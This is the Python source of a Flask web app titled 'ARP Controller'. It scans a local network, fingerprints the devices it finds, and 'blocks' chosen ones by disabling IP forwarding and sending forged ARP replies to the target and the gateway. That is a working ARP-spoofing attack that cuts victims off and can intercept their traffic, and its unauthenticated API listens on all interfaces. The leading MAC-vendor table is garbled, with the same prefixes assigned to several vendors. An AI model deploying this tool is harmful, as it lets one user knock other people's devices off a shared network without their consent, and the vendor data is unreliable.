    "08BA60": "Asus", "0C5428": "Asus", "0C8419": "Asus", "0CF2B2": "Asus",
    "10BF48": "Asus", "14CFA5": "Asus", "18F293": "Asus", "1C3AC4": "Asus",
    "1C6AB4": "Asus", "1CBFCE": "Asus", "1CF0D0": "Asus", "1C87AF": "Asus",
    "2017A8": "Asus", "20CF30": "Asus", "2469EB": "Asus", "286D58": "Asus",
    "2C4FDA": "Asus", "2CFDA0": "Asus", "309AF7": "Asus", "30D732": "Asus",
    "346B0E": "Asus", "3821A0": "Asus", "38D547": "Asus", "3C970E": "Asus",
    "3CA10A": "Asus", "40167E": "Asus", "40B3CD": "Asus", "44156E": "Asus",
    "485B39": "Asus", "507B9D": "Asus", "50BF5C": "Asus", "54BF1E": "Asus",
    "58FB59": "Asus", "5CA3A2": "Asus", "606BD0": "Asus", "60A4BC": "Asus",
    "6488D3": "Asus", "6CFB01": "Asus", "6CFBB7": "Asus", "70B5E8": "Asus",
    "74D02B": "Asus", "782B2B": "Asus", "7CE2A4": "Asus", "8082C0": "Asus",
    "84A5F1": "Asus", "8815B7": "Asus", "8C16E8": "Asus", "8C1EBF": "Asus",
    "8CA6DF": "Asus", "90B6AA": "Asus", "9465C8": "Asus", "9C6B01": "Asus",
    "A0CBD5": "Asus", "A8605B": "Asus", "AC1F74": "Asus", "AC7B5E": "Asus",
    "B0240F": "Asus", "B4D5BD": "Asus", "BC2C8A": "Asus", "C0F8A6": "Asus",
    "C8F6C6": "Asus", "D45C46": "Asus", "D462BD": "Asus", "D8CB8A": "Asus",
    "DC7142": "Asus", "E4493C": "Asus", "F8B116": "Asus",
    "001E10": "TP-Link", "001EE5": "TP-Link", "001FF6": "TP-Link", "002182": "TP-Link",
    "0023EB": "TP-Link", "00260A": "TP-Link", "002675": "TP-Link", "00269C": "TP-Link",
    "005F67": "TP-Link", "1062EB": "TP-Link", "1099C1": "TP-Link", "1428A7": "TP-Link",
    "144D8A": "TP-Link", "1489C0": "TP-Link", "14CC20": "TP-Link", "14CF2B": "TP-Link",
    "14E6E4": "TP-Link", "18D6C7": "TP-Link", "1C3AC4": "TP-Link", "1CFA68": "TP-Link",
    "201D4A": "TP-Link", "2039C2": "TP-Link", "2085C9": "TP-Link", "20E9CD": "TP-Link",
    "2477AB": "TP-Link", "28263E": "TP-Link", "286CE1": "TP-Link", "2C3A1A": "TP-Link",
    "2CE826": "TP-Link", "30DE4B": "TP-Link", "346B0E": "TP-Link", "38A28C": "TP-Link",
    "3C6AD0": "TP-Link", "3CC0D8": "TP-Link", "40F2E9": "TP-Link", "44184F": "TP-Link",
    "48D773": "TP-Link", "4C7EB0": "TP-Link", "503EAA": "TP-Link", "50C7BF": "TP-Link",
    "5429A6": "TP-Link", "5C628B": "TP-Link", "5C8A2B": "TP-Link", "6032B8": "TP-Link",
    "606BD0": "TP-Link", "60E327": "TP-Link", "6466B8": "TP-Link", "6C4B90": "TP-Link",
    "7092B1": "TP-Link", "7CBB3A": "TP-Link", "803F5D": "TP-Link", "8815B7": "TP-Link",
    "943247": "TP-Link", "9C5CF2": "TP-Link", "A0CBD5": "TP-Link", "A42B8C": "TP-Link",
    "A842A1": "TP-Link", "AC7B5E": "TP-Link", "B0A7B9": "TP-Link", "B4D5BD": "TP-Link",
    "BC5460": "TP-Link", "C006C3": "TP-Link", "D462BD": "TP-Link", "DC7142": "TP-Link",
    "E4493C": "TP-Link", "E8DE27": "TP-Link", "EC8C62": "TP-Link", "F8B116": "TP-Link",
    "FCA326": "TP-Link",
    "0004A8": "D-Link", "000BD1": "D-Link", "000D88": "D-Link", "000F3D": "D-Link",
    "001195": "D-Link", "001346": "D-Link", "0015E9": "D-Link", "00179A": "D-Link",
    "001CF0": "D-Link", "001EE5": "D-Link", "002170": "D-Link", "0023EB": "D-Link",
    "002401": "D-Link", "002531": "D-Link", "0050BA": "D-Link", "005BCA": "D-Link",
    "00802B": "D-Link", "0080C8": "D-Link", "00AD24": "D-Link", "00B646": "D-Link",
    "00CB49": "D-Link", "00CB5A": "D-Link", "040EA6": "D-Link", "04C4B0": "D-Link",
    "0C1DAF": "D-Link", "0C1DB0": "D-Link", "0C1DB1": "D-Link", "0C1DB2": "D-Link",
    "0C1DB3": "D-Link", "0C1DB4": "D-Link", "0C1DB5": "D-Link", "0C1DB6": "D-Link",
    "0C1DB7": "D-Link", "0C1DB8": "D-Link", "0C1DB9": "D-Link", "0C1DBA": "D-Link",
    "0C1DBB": "D-Link", "0C1DBC": "D-Link", "0C1DBD": "D-Link", "0C1DBE": "D-Link",
    "0C1DBF": "D-Link", "0C1DC0": "D-Link", "0C1DC1": "D-Link", "0C1DC2": "D-Link",
    "0C1DC3": "D-Link", "0C1DC4": "D-Link", "0C1DC5": "D-Link", "0C1DC6": "D-Link",
    "0C1DC7": "D-Link", "0C1DC8": "D-Link", "0C1DC9": "D-Link", "0C1DCA": "D-Link",
    "0C1DCB": "D-Link", "0C1DCC": "D-Link", "0C1DCD": "D-Link", "0C1DCE": "D-Link",
    "0C1DCF": "D-Link", "14D6B8": "D-Link", "1C5FD2": "D-Link", "1CA09B": "D-Link",
    "1CAE96": "D-Link", "2017A8": "D-Link", "20A63B": "D-Link", "244CE6": "D-Link",
    "286CE1": "D-Link", "309AF7": "D-Link", "346B0E": "D-Link", "38A28C": "D-Link",
    "3C6AD0": "D-Link", "40F2E9": "D-Link", "44184F": "D-Link", "50C7BF": "D-Link",
    "5429A6": "D-Link", "6032B8": "D-Link", "6466B8": "D-Link", "6C4B90": "D-Link",
    "7092B1": "D-Link", "7CBB3A": "D-Link", "803F5D": "D-Link", "9094E4": "D-Link",
    "943247": "D-Link", "A0CBD5": "D-Link", "A842A1": "D-Link", "AC7B5E": "D-Link",
    "B0A7B9": "D-Link", "B4D5BD": "D-Link", "C4A3BE": "D-Link", "D462BD": "D-Link",
    "DC7142": "D-Link", "E4493C": "D-Link", "F8B116": "D-Link",
    "00A0C5": "Huawei", "00E039": "Huawei", "00E06F": "Huawei", "00E088": "Huawei",
    "04C4B0": "Huawei", "0819F7": "Huawei", "0C1DAF": "Huawei", "0C8AE0": "Huawei",
    "10C2F8": "Huawei", "14CFA5": "Huawei", "18A8E2": "Huawei", "1C1AC0": "Huawei",
    "1CB72D": "Huawei", "1CF0AF": "Huawei", "20A63B": "Huawei", "24CF21": "Huawei",
    "286A25": "Huawei", "28C76E": "Huawei", "2CABEB": "Huawei", "30CBF0": "Huawei",
    "348846": "Huawei", "3C970E": "Huawei", "44156E": "Huawei", "48D773": "Huawei",
    "50D2F5": "Huawei", "5429A6": "Huawei", "58BF255": "Huawei", "606BD0": "Huawei",
    "6488D3": "Huawei", "6C4B90": "Huawei", "70B5E8": "Huawei", "7888C2": "Huawei",
    "8082C0": "Huawei", "8C1EBF": "Huawei", "8CA6DF": "Huawei", "90B6AA": "Huawei",
    "9465C8": "Huawei", "9C6B01": "Huawei", "A0CBD5": "Huawei", "A8605B": "Huawei",
    "AC7B5E": "Huawei", "B4D5BD": "Huawei", "C8F6C6": "Huawei", "D462BD": "Huawei",
    "D8CB8A": "Huawei", "DC7142": "Huawei", "E4493C": "Huawei", "F8B116": "Huawei",
    "FC45B3": "Huawei",
    "00133A": "Xiaomi", "0014A1": "Xiaomi", "002275": "Xiaomi", "00236D": "Xiaomi",
    "002511": "Xiaomi", "0025BC": "Xiaomi", "0088E8": "Xiaomi", "00A0C5": "Xiaomi",
    "040EA6": "Xiaomi", "04C4B0": "Xiaomi", "0C1DAF": "Xiaomi", "0C8AE0": "Xiaomi",
    "10C2F8": "Xiaomi", "14CFA5": "Xiaomi", "18A8E2": "Xiaomi", "1C1AC0": "Xiaomi",
    "1CB72D": "Xiaomi", "1CF0AF": "Xiaomi", "20A63B": "Xiaomi", "24CF21": "Xiaomi",
    "286A25": "Xiaomi", "28C76E": "Xiaomi", "2CABEB": "Xiaomi", "30CBF0": "Xiaomi",
    "348846": "Xiaomi", "3C970E": "Xiaomi", "44156E": "Xiaomi", "48D773": "Xiaomi",
    "50D2F5": "Xiaomi", "5429A6": "Xiaomi", "58BF255": "Xiaomi", "606BD0": "Xiaomi",
    "6488D3": "Xiaomi", "6C4B90": "Xiaomi", "70B5E8": "Xiaomi", "7888C2": "Xiaomi",
    "8082C0": "Xiaomi", "8C1EBF": "Xiaomi", "8CA6DF": "Xiaomi", "90B6AA": "Xiaomi",
    "9465C8": "Xiaomi", "9C6B01": "Xiaomi", "A0CBD5": "Xiaomi", "A8605B": "Xiaomi",
    "AC7B5E": "Xiaomi", "B4D5BD": "Xiaomi", "C8F6C6": "Xiaomi", "D462BD": "Xiaomi",
    "D8CB8A": "Xiaomi", "DC7142": "Xiaomi", "E4493C": "Xiaomi", "F8B116": "Xiaomi",
    "FC45B3": "Xiaomi",
    "00059A": "Hon Hai (Foxconn)", "000830": "Hon Hai (Foxconn)", "000E0C": "Hon Hai (Foxconn)",
    "00129B": "Hon Hai (Foxconn)", "0015AF": "Hon Hai (Foxconn)", "00179A": "Hon Hai (Foxconn)",
    "001C4A": "Hon Hai (Foxconn)", "001ECA": "Hon Hai (Foxconn)", "001ECB": "Hon Hai (Foxconn)",
    "001ECC": "Hon Hai (Foxconn)", "001ECD": "Hon Hai (Foxconn)", "001ECE": "Hon Hai (Foxconn)",
    "001ECF": "Hon Hai (Foxconn)", "001ED0": "Hon Hai (Foxconn)", "001ED1": "Hon Hai (Foxconn)",
    "001ED2": "Hon Hai (Foxconn)", "002566": "Hon Hai (Foxconn)", "003683": "Hon Hai (Foxconn)",
    "041E64": "Hon Hai (Foxconn)", "0819F7": "Hon Hai (Foxconn)", "0C1DAF": "Hon Hai (Foxconn)",
    "109AE6": "Hon Hai (Foxconn)", "109AE7": "Hon Hai (Foxconn)", "109AE8": "Hon Hai (Foxconn)",
    "109AE9": "Hon Hai (Foxconn)", "109AEA": "Hon Hai (Foxconn)", "109AEB": "Hon Hai (Foxconn)",
    "109AEC": "Hon Hai (Foxconn)", "109AED": "Hon Hai (Foxconn)", "109AEE": "Hon Hai (Foxconn)",
    "109AEF": "Hon Hai (Foxconn)", "109AF0": "Hon Hai (Foxconn)", "109AF1": "Hon Hai (Foxconn)",
    "109AF2": "Hon Hai (Foxconn)", "109AF3": "Hon Hai (Foxconn)", "109AF4": "Hon Hai (Foxconn)",
    "109AF5": "Hon Hai (Foxconn)", "109AF6": "Hon Hai (Foxconn)", "109AF7": "Hon Hai (Foxconn)",
    "109AF8": "Hon Hai (Foxconn)", "109AF9": "Hon Hai (Foxconn)", "109AFA": "Hon Hai (Foxconn)",
    "109AFB": "Hon Hai (Foxconn)", "109AFC": "Hon Hai (Foxconn)", "109AFD": "Hon Hai (Foxconn)",
    "109AFE": "Hon Hai (Foxconn)", "109AFF": "Hon Hai (Foxconn)", "14CFA5": "Hon Hai (Foxconn)",
    "28B45C": "Hon Hai (Foxconn)", "346B0E": "Hon Hai (Foxconn)", "38A28C": "Hon Hai (Foxconn)",
    "3C6AD0": "Hon Hai (Foxconn)", "40F2E9": "Hon Hai (Foxconn)", "44184F": "Hon Hai (Foxconn)",
    "50C7BF": "Hon Hai (Foxconn)", "5429A6": "Hon Hai (Foxconn)", "6032B8": "Hon Hai (Foxconn)",
    "6466B8": "Hon Hai (Foxconn)", "6C4B90": "Hon Hai (Foxconn)", "7092B1": "Hon Hai (Foxconn)",
    "7CBB3A": "Hon Hai (Foxconn)", "803F5D": "Hon Hai (Foxconn)", "9094E4": "Hon Hai (Foxconn)",
    "943247": "Hon Hai (Foxconn)", "A0CBD5": "Hon Hai (Foxconn)", "A842A1": "Hon Hai (Foxconn)",
    "AC7B5E": "Hon Hai (Foxconn)", "B0A7B9": "Hon Hai (Foxconn)", "B4D5BD": "Hon Hai (Foxconn)",
    "C4A3BE": "Hon Hai (Foxconn)", "D462BD": "Hon Hai (Foxconn)", "DC7142": "Hon Hai (Foxconn)",
    "E4493C": "Hon Hai (Foxconn)", "F8B116": "Hon Hai (Foxconn)",
    "001CB3": "Raspberry Pi", "001FBB": "Raspberry Pi", "0024F7": "Raspberry Pi",
    "002510": "Raspberry Pi", "002545": "Raspberry Pi", "B827EB": "Raspberry Pi",
    "DC614E": "Raspberry Pi", "E45F01": "Raspberry Pi",
}


def _get_mac_vendor(mac: str) -> str:
    if not mac or len(mac) < 8:
        return ""
    oui = mac.replace(":", "").replace("-", "").upper()[:6]
    return OUI_TABLE.get(oui, "")


def _guess_os_from_ttl(ttl: int | None) -> str:
    if ttl is None:
        return "Unknown"
    if ttl <= 64:
        return "Linux / macOS / Unix"
    if ttl <= 128:
        return "Windows"
    if ttl <= 255:
        return "Network Device / IoT"
    return "Unknown"


def _ping_once(target_ip: str) -> tuple[int | None, float | None]:
    ttl = None
    rtt = None
    try:
        if platform.system() == "Windows":
            result = subprocess.run(
                ["ping", "-n", "1", "-w", "2000", target_ip],
                capture_output=True, text=True, timeout=5
            )
        else:
            result = subprocess.run(
                ["ping", "-c", "1", "-W", "2", target_ip],
                capture_output=True, text=True, timeout=5
            )
        for line in result.stdout.split("\n"):
            if "TTL=" in line or "ttl=" in line:
                for part in line.split():
                    if "TTL=" in part or "ttl=" in part:
                        try:
                            ttl = int(part.split("=")[-1])
                        except ValueError:
                            pass
            if "time=" in line or "time<" in line:
                for part in line.split():
                    if part.startswith("time=") or part.startswith("time<"):
                        try:
                            rtt = float(part.split("=")[-1].replace("ms", ""))
                        except ValueError:
                            pass
    except Exception:
        pass
    return ttl, rtt


def _resolve_hostname(ip: str) -> str:
    try:
        name, _, _ = socket.gethostbyaddr(ip)
        return name
    except Exception:
        pass
    if platform.system() == "Windows":
        try:
            result = subprocess.run(
                ["nbtstat", "-A", ip],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.split("\n"):
                if "<00>" in line and "UNIQUE" in line:
                    parts = line.split()
                    if parts:
                        return parts[0]
        except Exception:
            pass
    return ""


def _is_admin():
    try:
        if platform.system() == "Windows":
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except Exception:
        return False


def get_network_info():
    global gateway_ip, gateway_mac, local_ip, local_mac, interface

    if platform.system() == "Windows":
        result = subprocess.run(
            ["route", "print", "0.0.0.0"],
            capture_output=True, text=True, timeout=10
        )
        for line in result.stdout.strip().split("\n"):
            parts = line.split()
            if len(parts) >= 3 and parts[0] == "0.0.0.0" and parts[1] == "0.0.0.0":
                gateway_ip = parts[2]
                break
    else:
        result = subprocess.run(
            ["ip", "route"],
            capture_output=True, text=True, timeout=10
        )
        for line in result.stdout.split("\n"):
            if line.startswith("default"):
                parts = line.split()
                gateway_ip = parts[2]
                if len(parts) > 4:
                    interface = parts[4]
                break

    if not gateway_ip:
        print("ERROR: Could not determine gateway IP. Are you connected to a network?")
        sys.exit(1)

    gateway_mac = getmacbyip(gateway_ip) or "ff:ff:ff:ff:ff:ff"

    iface = conf.iface
    interface = iface
    try:
        local_ip = get_if_addr(iface)
    except Exception:
        local_ip = ""
    try:
        local_mac = get_if_hwaddr(iface)
    except Exception:
        local_mac = ""

    if not local_ip or local_ip == "0.0.0.0":
        for iface_name in conf.ifaces:
            try:
                addr = get_if_addr(iface_name)
                if addr and addr != "0.0.0.0" and not addr.startswith("127."):
                    local_ip = addr
                    local_mac = get_if_hwaddr(iface_name)
                    interface = iface_name
                    break
            except Exception:
                continue

    print(f"Local IP: {local_ip}, MAC: {local_mac}")
    print(f"Gateway IP: {gateway_ip}, MAC: {gateway_mac}")
    print(f"Interface: {interface}")


def get_subnet():
    try:
        if local_ip and "/" in local_ip:
            return str(ipaddress.ip_network(local_ip, strict=False))
        if local_ip:
            return str(ipaddress.ip_network(f"{local_ip}/24", strict=False))
    except Exception:
        pass
    return "192.168.0.0/24"


def _enrich_device(ip: str, mac: str) -> dict:
    ttl, rtt = _ping_once(ip)
    hostname = _resolve_hostname(ip)
    vendor = _get_mac_vendor(mac)
    return {
        "ip": ip,
        "mac": mac,
        "blocked": ip in blocked_devices,
        "hostname": hostname,
        "vendor": vendor,
        "os_guess": _guess_os_from_ttl(ttl),
        "ttl": ttl,
        "rtt": rtt,
    }


def _ping_sweep(subnet: str):
    net = ipaddress.ip_network(subnet, strict=False)
    ips = [str(ip) for ip in net.hosts() if str(ip) != local_ip]
    batch_size = 64

    for i in range(0, len(ips), batch_size):
        batch = ips[i:i + batch_size]
        if platform.system() == "Windows":
            for ip in batch:
                try:
                    subprocess.run(
                        ["ping", "-n", "1", "-w", "500", ip],
                        capture_output=True, timeout=2
                    )
                except Exception:
                    pass
        else:
            targets = " ".join(batch)
            try:
                subprocess.run(
                    f"ping -c 1 -W 0.5 {targets}",
                    shell=True, capture_output=True, timeout=10
                )
            except Exception:
                pass


def _read_arp_cache() -> dict[str, str]:
    cache: dict[str, str] = {}
    try:
        if platform.system() == "Windows":
            result = subprocess.run(
                ["arp", "-a"],
                capture_output=True, text=True, timeout=5
            )
            for line in result.stdout.split("\n"):
                line = line.strip()
                if not line or line.startswith("Interface") or line.startswith("---"):
                    continue
                parts = line.split()
                if len(parts) >= 2:
                    ip = parts[0].strip()
                    mac = parts[1].replace("-", ":").lower()
                    if len(mac) == 17 and mac != "ff:ff:ff:ff:ff:ff":
                        cache[ip] = mac
        else:
            with open("/proc/net/arp", "r") as f:
                for line in f:
                    if line.startswith("IP"):
                        continue
                    parts = line.split()
                    if len(parts) >= 4:
                        ip = parts[0]
                        mac = parts[3].lower()
                        if mac != "00:00:00:00:00:00" and mac != "ff:ff:ff:ff:ff:ff":
                            cache[ip] = mac
    except Exception:
        pass
    return cache


def arp_scan():
    global scan_results
    with scan_lock:
        subnet = get_subnet()

        _ping_sweep(subnet)
        time.sleep(1)

        arp = ARP(pdst=subnet)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp

        found: dict[str, str] = {}

        try:
            answered, _ = srp(
                packet, timeout=5,
                iface=interface if interface else None,
                verbose=False,
                retry=3,
                inter=0.1,
            )
            for sent, received in answered:
                ip = received.psrc
                mac = received.hwsrc
                if ip != local_ip:
                    found[ip] = mac
        except Exception as e:
            print(f"ARP scan error: {e}")

        arp_cache = _read_arp_cache()
        for ip, mac in arp_cache.items():
            if ip != local_ip and ip not in found:
                try:
                    addr = ipaddress.ip_address(ip)
                    if addr in ipaddress.ip_network(subnet, strict=False):
                        found[ip] = mac
                except ValueError:
                    pass

        if gateway_ip and gateway_ip != local_ip and gateway_mac and gateway_ip not in found:
            found[gateway_ip] = gateway_mac

        results = []
        with ThreadPoolExecutor(max_workers=16) as pool:
            futures = {pool.submit(_enrich_device, ip, mac): ip for ip, mac in found.items()}
            for future in as_completed(futures):
                try:
                    results.append(future.result(timeout=10))
                except Exception:
                    ip = futures[future]
                    results.append({
                        "ip": ip, "mac": found.get(ip, ""), "blocked": ip in blocked_devices,
                        "hostname": "", "vendor": "", "os_guess": "Unknown",
                        "ttl": None, "rtt": None,
                    })

        scan_results = results
        return results


def _check_ip_forwarding():
    global original_ip_forward
    if platform.system() == "Windows":
        try:
            result = subprocess.run(
                ["reg", "query",
                 r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                 "/v", "IPEnableRouter"],
                capture_output=True, text=True, timeout=5
            )
            original_ip_forward = "0x1" in result.stdout or "REG_DWORD    0x1" in result.stdout
        except Exception:
            original_ip_forward = False
    else:
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
                original_ip_forward = f.read().strip() == "1"
        except Exception:
            original_ip_forward = False


def set_ip_forwarding(enable: bool):
    if platform.system() == "Windows":
        val = "1" if enable else "0"
        try:
            subprocess.run(
                ["reg", "add",
                 r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                 "/v", "IPEnableRouter", "/t", "REG_DWORD",
                 "/d", val, "/f"],
                capture_output=True, timeout=5
            )
        except Exception as e:
            print(f"Failed to set IP forwarding: {e}")
    else:
        val = "1" if enable else "0"
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(val)
        except Exception as e:
            print(f"Failed to set IP forwarding: {e}")


def spoof_loop(target_ip: str, target_mac: str, stop_event: threading.Event):
    gw_mac = gateway_mac or getmacbyip(gateway_ip) or "ff:ff:ff:ff:ff:ff"
    attacker_mac = local_mac
    if not attacker_mac:
        try:
            attacker_mac = get_if_hwaddr(interface if interface else conf.iface)
        except Exception:
            print("Could not determine attacker MAC")
            return

    while not stop_event.is_set():
        arp_to_target = ARP(
            op=2, pdst=target_ip, hwdst=target_mac,
            psrc=gateway_ip, hwsrc=attacker_mac
        )
        arp_to_gateway = ARP(
            op=2, pdst=gateway_ip, hwdst=gw_mac,
            psrc=target_ip, hwsrc=attacker_mac
        )
        try:
            send(arp_to_target, iface=interface if interface else None, verbose=False)
            send(arp_to_gateway, iface=interface if interface else None, verbose=False)
        except Exception as e:
            print(f"Error sending ARP spoof: {e}")
        stop_event.wait(2)


def _get_mac_for_ip(target_ip: str) -> str | None:
    for dev in scan_results:
        if dev["ip"] == target_ip:
            return dev["mac"]
    return getmacbyip(target_ip)


def restore_arp(target_ip: str, target_mac: str):
    gw_mac = gateway_mac or getmacbyip(gateway_ip)
    if not gw_mac:
        return

    for _ in range(5):
        arp_to_target = ARP(
            op=2, pdst=target_ip, hwdst=target_mac,
            psrc=gateway_ip, hwsrc=gw_mac
        )
        arp_to_gateway = ARP(
            op=2, pdst=gateway_ip, hwdst=gw_mac,
            psrc=target_ip, hwsrc=target_mac
        )
        try:
            send(arp_to_target, iface=interface if interface else None, verbose=False)
            send(arp_to_gateway, iface=interface if interface else None, verbose=False)
        except Exception:
            pass
        time.sleep(0.5)


def _cleanup():
    print("\nCleaning up... restoring ARP tables...")
    for ip in list(blocked_devices.keys()):
        if ip in stop_events:
            stop_events[ip].set()
    for ip, t in list(spoof_threads.items()):
        t.join(timeout=5)
    for ip, info in list(blocked_devices.items()):
        mac = info.get("mac")
        if mac:
            restore_arp(ip, mac)
    blocked_devices.clear()
    stop_events.clear()
    spoof_threads.clear()
    set_ip_forwarding(original_ip_forward)
    print("Cleanup complete.")


atexit.register(_cleanup)


@app.route("/")
def index():
    return send_from_directory(FRONTEND_DIR, "index.html")


@app.route("/<path:filename>")
def serve_frontend(filename):
    if filename.startswith("api/"):
        return jsonify({"error": "Not found"}), 404
    safe_path = os.path.normpath(filename)
    if safe_path.startswith("..") or os.path.isabs(safe_path):
        return jsonify({"error": "Not found"}), 404
    full_path = os.path.join(FRONTEND_DIR, safe_path)
    if not os.path.isfile(full_path):
        return jsonify({"error": "Not found"}), 404
    return send_from_directory(FRONTEND_DIR, safe_path)


@app.route("/api/scan", methods=["GET"])
def api_scan():
    results = arp_scan()
    return jsonify({"devices": results})


@app.route("/api/devices", methods=["GET"])
def api_devices():
    for dev in scan_results:
        dev["blocked"] = dev["ip"] in blocked_devices
    return jsonify({"devices": scan_results})


@app.route("/api/block", methods=["POST"])
def api_block():
    data = request.get_json(force=True)
    if not data or "ip" not in data:
        return jsonify({"error": "IP address required"}), 400

    target_ip = data["ip"]

    with block_lock:
        if target_ip in blocked_devices:
            return jsonify({"error": "Device already blocked"}), 400

        if target_ip == gateway_ip:
            return jsonify({"error": "Cannot block the gateway"}), 400

        if target_ip == local_ip:
            return jsonify({"error": "Cannot block yourself"}), 400

        target_mac = _get_mac_for_ip(target_ip)
        if not target_mac:
            return jsonify({"error": "Cannot resolve MAC address for this IP"}), 400

        set_ip_forwarding(False)

        stop_event = threading.Event()
        stop_events[target_ip] = stop_event

        t = threading.Thread(
            target=spoof_loop,
            args=(target_ip, target_mac, stop_event),
            daemon=True
        )
        spoof_threads[target_ip] = t
        t.start()

        blocked_devices[target_ip] = {
            "ip": target_ip,
            "mac": target_mac,
            "blocked_at": time.time(),
        }

        for dev in scan_results:
            if dev["ip"] == target_ip:
                dev["blocked"] = True

    print(f"Blocked: {target_ip}")
    return jsonify({"status": "blocked", "ip": target_ip})


@app.route("/api/unblock", methods=["POST"])
def api_unblock():
    data = request.get_json(force=True)
    if not data or "ip" not in data:
        return jsonify({"error": "IP address required"}), 400

    target_ip = data["ip"]

    with block_lock:
        if target_ip not in blocked_devices:
            return jsonify({"error": "Device not blocked"}), 400

        if target_ip in stop_events:
            stop_events[target_ip].set()
            del stop_events[target_ip]

        if target_ip in spoof_threads:
            spoof_threads[target_ip].join(timeout=5)
            del spoof_threads[target_ip]

        target_mac = blocked_devices[target_ip].get("mac") or _get_mac_for_ip(target_ip)
        if target_mac:
            restore_arp(target_ip, target_mac)

        del blocked_devices[target_ip]

        if not blocked_devices:
            set_ip_forwarding(original_ip_forward)

        for dev in scan_results:
            if dev["ip"] == target_ip:
                dev["blocked"] = False

    print(f"Unblocked: {target_ip}")
    return jsonify({"status": "unblocked", "ip": target_ip})


@app.route("/api/device", methods=["GET"])
def api_device_detail():
    target_ip = request.args.get("ip", "")
    if not target_ip:
        return jsonify({"error": "IP parameter required"}), 400
    is_gateway = (target_ip == gateway_ip)
    is_self = (target_ip == local_ip)

    device = None
    for dev in scan_results:
        if dev["ip"] == target_ip:
            device = dev
            break

    if is_gateway:
        device_type = "Gateway / Router"
        blocked_info = None
        if target_ip in blocked_devices:
            blocked_info = {
                "blocked": True,
                "duration": time.time() - blocked_devices[target_ip]["blocked_at"],
            }
        gw_hostname = ""
        for dev in scan_results:
            if dev["ip"] == target_ip:
                gw_hostname = dev.get("hostname", "")
                break
        return jsonify({
            "ip": target_ip,
            "mac": gateway_mac,
            "hostname": gw_hostname,
            "vendor": _get_mac_vendor(gateway_mac),
            "os_guess": _guess_os_from_ttl(None),
            "ttl": None,
            "rtt": None,
            "blocked_info": blocked_info,
            "device_type": device_type,
        })

    if is_self:
        return jsonify({
            "ip": target_ip,
            "mac": local_mac,
            "hostname": socket.gethostname(),
            "vendor": _get_mac_vendor(local_mac),
            "os_guess": platform.system(),
            "ttl": None,
            "rtt": None,
            "blocked_info": None,
            "device_type": "This Device",
        })

    if not device:
        return jsonify({"error": "Device not found"}), 404

    blocked_info = None
    if target_ip in blocked_devices:
        blocked_info = {
            "blocked": True,
            "duration": time.time() - blocked_devices[target_ip]["blocked_at"],
        }

    return jsonify({
        "ip": device["ip"],
        "mac": device["mac"],
        "hostname": device.get("hostname", ""),
        "vendor": device.get("vendor", ""),
        "os_guess": device.get("os_guess", "Unknown"),
        "ttl": device.get("ttl"),
        "rtt": device.get("rtt"),
        "blocked_info": blocked_info,
        "device_type": "Client",
    })


@app.route("/api/status", methods=["GET"])
def api_status():
    status = {}
    for ip, info in blocked_devices.items():
        status[ip] = {
            "blocked": True,
            "duration": time.time() - info["blocked_at"],
        }
    return jsonify({
        "blocked": status,
        "gateway": gateway_ip,
        "gateway_mac": gateway_mac,
        "local_ip": local_ip,
        "local_mac": local_mac,
    })


if __name__ == "__main__":
    print("=" * 50)
    print("  ARP Controller - Network Device Manager")
    print("=" * 50)

    if not _is_admin():
        print("\nWARNING: Not running with administrator/root privileges!")
        print("ARP spoofing requires elevated privileges. Please restart as admin.\n")

    print("Initializing network info...")
    get_network_info()
    _check_ip_forwarding()
    print(f"Subnet: {get_subnet()}")
    print(f"IP forwarding was: {'ON' if original_ip_forward else 'OFF'}")
    print("\nServer starting on http://localhost:5000")
    print("Open this URL in your browser to use the application.\n")
    app.run(host="0.0.0.0", port=5000, debug=False)
